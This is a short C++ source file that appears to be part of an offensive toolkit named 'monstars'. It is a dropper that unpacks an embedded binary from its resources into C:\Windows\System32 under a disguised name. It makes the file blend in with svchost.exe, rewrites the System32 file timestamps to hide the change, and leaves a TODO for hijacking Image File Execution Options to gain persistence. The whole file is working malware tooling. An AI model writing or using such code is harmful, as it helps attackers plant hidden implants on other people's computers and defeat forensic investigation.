#include <Windows.h>

#include <monstars/file.h>
#include <monstars/logging.h>

#include "resource.h"

constexpr wchar_t c_ExemplarPath[] = L"C:\\Windows\\System32\\svchost.exe";

// stampable values - configured via web interface or helper script
constexpr wchar_t c_ListenerName[MAX_PATH] = L"BASKETBALLJONES";

int main()
{
    // load the provider DLL resource
    LPVOID providerBin = nullptr;
    DWORD providerSize = 0;
    HRSRC resInfo = FindResourceW(NULL, MAKEINTRESOURCEW(IDR_BUPKUS1), L"BUPKUS");
    if (resInfo)
    {
        HGLOBAL res = LoadResource(NULL, resInfo);
        if (res)
        {
            providerSize = SizeofResource(NULL, resInfo);
            providerBin = LockResource(res);
        }
    }
    if (!providerBin)
    {
        LOG_LINE_ERROR;
        return ERROR_RESOURCE_DATA_NOT_FOUND;
    }

    // write the provider DLL to disk
    wchar_t targetPath[MAX_PATH];
    wsprintfW(targetPath, L"C:\\Windows\\System32\\%s.exe", c_ListenerName);
    if (!monstars::DropAndBlendFile(targetPath, static_cast<char*>(providerBin), providerSize, c_ExemplarPath))
    {
        LOG_LINE_ERROR;
        return ERROR_WRITE_FAULT;
    }
    // fix system32 timestamps
    if (!monstars::MatchFileTimes(L"C:\\Windows\\System32", c_ExemplarPath))
    {
        LOG_LINE_ERROR;
        return ERROR_TIME_SKEW;
    }
    
    // TODO: dork Image File Execution Options key

    return ERROR_SUCCESS;
}
